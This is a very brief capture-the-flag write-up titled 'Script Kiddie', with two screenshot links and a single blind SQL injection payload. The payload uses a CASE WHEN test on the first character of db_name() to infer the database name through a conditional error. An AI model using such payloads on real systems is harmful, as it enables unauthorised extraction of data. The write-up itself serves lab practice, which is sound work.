# Script Kiddie

![image](https://user-images.githubusercontent.com/61876488/138734841-93adf918-5e68-4ec4-8d81-9401f643cacd.png)

[Source]()

### 1. Initial reconaissance:

![image](https://user-images.githubusercontent.com/61876488/139046934-9f31fbf9-36c9-4774-9736-a8befe8ad501.png)

### 2. Exploit and get the flag:

```
(CASE WHEN (ascii(substring(db_name(), 1, 1)) =115) THEN 99 ELSE 1*'name' end)
```


